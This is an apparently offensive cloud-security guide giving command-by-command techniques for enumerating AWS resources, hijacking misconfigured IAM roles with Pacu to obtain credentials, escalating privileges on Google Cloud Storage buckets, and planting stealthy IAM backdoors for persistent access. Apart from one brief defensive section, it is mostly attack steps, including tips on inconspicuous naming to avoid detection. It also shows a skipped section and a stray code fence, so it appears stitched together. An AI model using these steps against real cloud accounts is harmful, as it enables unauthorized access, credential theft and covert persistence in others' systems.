### **Techniques for Enumerating AWS Resources**

Amazon Web Services (AWS) offers a variety of resources, and attackers often attempt to enumerate these to identify vulnerabilities, misconfigurations, or valuable information. Below are detailed techniques for enumerating key AWS resources like EC2 instances, RDS instances, IAM roles, and account IDs.

---

### **1. Enumerating EC2 Instances**
Amazon EC2 is used to run virtual servers, and attackers may enumerate instances to gather details about configurations, networking, security groups, and attached volumes.

#### **Common AWS CLI Commands for EC2 Enumeration**
- **List all EC2 instances**:
  ```bash
  aws ec2 describe-instances
  ```
- **Identify if Metadata API v1 is used** (easier for key exfiltration):
  ```bash
  aws ec2 describe-instances --filters Name=metadata-options.http-tokens,Values=optional
  ```
- **Extract user data**:
  ```bash
  aws ec2 describe-instance-attribute --instance-id <id> --attribute userData --output text --query "UserData.Value" | base64 --decode
  ```
- **List volumes**:
  ```bash
  aws ec2 describe-volumes
  ```
- **List snapshots**:
  ```bash
  aws ec2 describe-snapshots
  ```
- **List security groups**:
  ```bash
  aws ec2 describe-security-groups
  ```
- **Find security groups allowing SSH (port 22)**:
  ```bash
  aws ec2 describe-security-groups --filters Name=ip-permission.from-port,Values=22 Name=ip-permission.to-port,Values=22 Name=ip-permission.cidr,Values='0.0.0.0/0'
  ```
- **List instances in a fleet**:
  ```bash
  aws ec2 describe-fleet-instances
  ```
- **List dedicated hosts**:
  ```bash
  aws ec2 describe-hosts
  ```
- **List SSH key pairs**:
  ```bash
  aws ec2 describe-key-pairs
  ```
- **Enumerate gateways (Internet, NAT, transit, etc.)**:
  ```bash
  aws ec2 describe-internet-gateways
  aws ec2 describe-nat-gateways
  aws ec2 describe-transit-gateways
  aws ec2 describe-vpn-gateways
  ```

  ```

---

### **3. Enumerating AWS Account IDs**
AWS account IDs are unique and often exposed unintentionally, making them a valuable target for attackers.

#### **Common Sources of Account ID Leaks**
- **Publicly shared resources**:
  - Look for S3 bucket URLs or Lambda function ARNs.
- **ARNs**:
  - Account IDs are part of ARNs shared in documentation or logs.
- **IAM Policies and Roles**:
  - Policies shared externally may expose account IDs.

---

### **4. Enumerating IAM Roles**
IAM roles define permissions, and attackers often attempt to enumerate them to identify roles they can assume.

#### **Common Techniques**
- **Analyze AWS error messages**:
  - Target non-existent roles to identify error differences.
  - Example:
    ```bash
    aws sts assume-role --role-arn <role_arn> --role-session-name test-session
    ```
- **Use tools like PMapper (Principal Mapper)**:
  - Visualizes IAM users and roles in a graph for privilege escalation analysis.
    ```bash
    git clone https://github.com/nccgroup/PMapper.git
    cd PMapper
    python3 pmapper.py graph account-data.json
    ```

---

### **5. Defensive Measures**
To protect against resource enumeration, organizations should:

#### **Access Controls**
- Use **IAM least-privilege policies** to restrict access to sensitive resources.
- Restrict access to **AWS CLI commands** by limiting permissions like:
  - `ec2:DescribeInstances`
  - `rds:DescribeDBInstances`
  - `iam:ListRoles`

#### **Logging and Monitoring**
- Enable AWS **CloudTrail** to log API activity.
- Monitor logs for suspicious enumeration activities, such as repeated `describe` commands.

---

#### **Using Pacu to Hijack IAM Roles**
1. **Setup and Prerequisites:**
   - Obtain the **AWS account ID** of the target.
   - Install Pacu: Clone the repository from [Pacu GitHub](https://github.com/RhinoSecurityLabs/pacu) and set it up in your environment.
   - Ensure the IAM permissions needed for `sts:AssumeRole` are available.

2. **Enumerate Roles with Pacu:**
   - Pacu uses a built-in wordlist of common role names to identify misconfigured IAM roles.
   - Run the following script to begin role enumeration:
     ```bash
     python3 pacu.py
     ```
   - Use the **AssumeRole enumeration module**:
     ```bash
     assume_role_enum.py -I <Account_ID> -w <Word_List>
     ```
   - If successful, Pacu identifies roles like "APIGateway" or others that are misconfigured and auto-assumes them.

3. **Assume the Role:**
   - Once Pacu finds a misconfigured role, it automatically assumes it and extracts the credentials.
   - Credentials are displayed in **JSON format**, including the Access Key, Secret Key, and Session Token.

4. **Exploiting the Role:**
   - Use the obtained credentials to perform actions like:
     - Listing S3 buckets: 
       ```bash
       aws s3 ls --profile <hijacked-profile>
       ```

### **Privilege Escalation and Persistent Access in GCP**

#### **1. Escalating Privileges of Google Storage Buckets using GCPBucketBrute**

Google Storage buckets, similar to AWS S3 buckets, can be exploited for privilege escalation through misconfigured ACLs (Access Control Lists). Attackers can use tools like **GCPBucketBrute** to identify and exploit vulnerable buckets.

---

##### **Steps to Use GCPBucketBrute for Privilege Escalation**:

1. **Check Bucket Permissions**:
   - Make a direct HTTP request to verify bucket access:
     ```bash
     curl -X GET https://www.googleapis.com/storage/v1/b/<BUCKET_NAME>/iam
     ```
   - If "allUsers" or "allAuthenticatedUsers" have access, a valid response is returned.

2. **Use `TestIamPermissions` API**:
   - Query bucket permissions by specifying a bucket name and list of permissions:
     ```bash
     curl -X POST \
       -H "Authorization: Bearer $(gcloud auth application-default print-access-token)" \
       -H "Content-Type: application/json" \
       --data '{"permissions": ["storage.buckets.get", "storage.objects.list"]}' \
       https://storage.googleapis.com/storage/v1/b/<BUCKET_NAME>/iam/testIamPermissions
     ```

3. **Run GCPBucketBrute**:
   - Enumerate buckets and check permissions:
     ```bash
     python3 gcpbucketbrute.py --buckets <bucket_list_file>
     ```
   - If the tool identifies a bucket as vulnerable, escalate privileges.

4. **Escalate Privileges**:
   - Modify or add policies that allow higher-level access.

---

#### **2. Maintaining Persistent Access Using IAM Roles**

Once attackers gain sufficient privileges, they can create backdoors by configuring IAM roles and permissions to maintain long-term access.

---

##### **Steps to Create Backdoors with IAM Roles**:

1. **Create a New IAM Role**:
   ```bash
   gcloud iam roles create <ROLE_NAME> --project=<PROJECT_ID> --file=role-definition.yaml
   ```
   - The `role-definition.yaml` file defines elevated permissions, such as "roles/owner."

2. **Attach the Role to a Service Account**:
   ```bash
   gcloud projects add-iam-policy-binding <PROJECT_ID> \
       --member="serviceAccount:<SERVICE_ACCOUNT>@<PROJECT_ID>.iam.gserviceaccount.com" \
       --role="roles/<ROLE_NAME>"
   ```

3. **Ensure Stealth**:
   - Use inconspicuous naming conventions for roles and service accounts.
   - Rotate service account credentials periodically:
     ```bash
     gcloud iam service-accounts keys create \
         --iam-account <SERVICE_ACCOUNT>@<PROJECT_ID>.iam.gserviceaccount.com \
         <key_file.json>
     ```
